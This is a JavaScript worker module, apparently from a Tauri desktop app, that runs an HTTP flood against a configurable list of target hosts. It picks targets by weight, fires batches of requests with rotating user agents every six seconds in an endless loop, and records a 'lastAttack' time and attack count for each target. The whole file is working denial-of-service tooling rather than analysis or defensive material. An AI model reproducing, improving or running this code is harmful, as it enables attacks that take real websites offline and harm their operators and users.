import weightedRandom from 'weighted-random';
import state from '@/utils/state.js';
import { invoke } from '@tauri-apps/api/tauri'

let statusWorker = false;
const shootIntervalSeconds = 6;

const createFetchesArray = () => {
  const fetchArray = [];
  for (let i = 1; i <= shootIntervalSeconds * state.limitRequestsPerSecond; i++) {
    const randomUrlIdx = weightedRandom(state.weight);
    const { host, proto, _id } = state.tasks[randomUrlIdx];
    fetchArray.push(`${proto}://${host}`);
    state.log[_id] = {
      ...state.log[_id],
      count: state.log[_id].count + 1,
      lastAttack: new Date(),
    };
  }
  return fetchArray;
};

const WINDOW_SIZE_MS = 60_000;
const WOINDOW_TAIL_TO_HEAD_RATIO = 0.3; // 0.3 - tail - 0.7 head
const REFRESH_RPS_RATE_MS = 1500;

const moveFloatingRPSWindows = async () => {
  let windowStart = new Date();
  let requestsAtWindowStart = state.totalRequests;
  // eslint-disable-next-line
  while (true) {
    state.windowStart = windowStart;
    state.requestsAtWindowStart = requestsAtWindowStart;
    await new Promise(r => setTimeout(r, WINDOW_SIZE_MS * WOINDOW_TAIL_TO_HEAD_RATIO)); 
    windowStart = new Date();
    requestsAtWindowStart = state.totalRequests;
    await new Promise(r => setTimeout(r, WINDOW_SIZE_MS * (1 - WOINDOW_TAIL_TO_HEAD_RATIO)));
  }
};

const runRPSRefresher = async () => {
  // eslint-disable-next-line
  while (true) {
    await new Promise(r => setTimeout(r, REFRESH_RPS_RATE_MS));
    state.currentRPS = Math.ceil(
      (state.totalRequests - state.requestsAtWindowStart) / (new Date() - state.windowStart) * 1000
    );
  }
};

const worker = async () => {
  if (!state.tasks.length) {
    statusWorker = false;
    return false;
  }
  moveFloatingRPSWindows();
  runRPSRefresher();
  state.startWorker = +new Date();
  state.totalRequests = 0;

  // eslint-disable-next-line
  while (1) {
    const urls = createFetchesArray();
    let invokeTookMs;
    try {
      const beforeFetch = new Date();
      state.totalRequests += Math.round(urls.length / 2);
      await invoke('run_fetch', {
        data: JSON.stringify({
          ua: state.userAgents,
          urls,
        })
      });
      state.totalRequests += Math.round(urls.length / 2);
      invokeTookMs = new Date() - beforeFetch;
      console.log('invoke took', invokeTookMs);
    } catch (e) {
      console.log('Somewhere has been rejected, current requests =>', e, state.totalRequests);
    }
    const holdOnTime = Math.max(0, shootIntervalSeconds * 1000 - invokeTookMs);
    await new Promise((r) => setTimeout(r, holdOnTime ));
  }
};

const startWorker = () => {
  if (!statusWorker) {
    statusWorker = true;
    worker();
  }
};

export { startWorker };
export default worker;
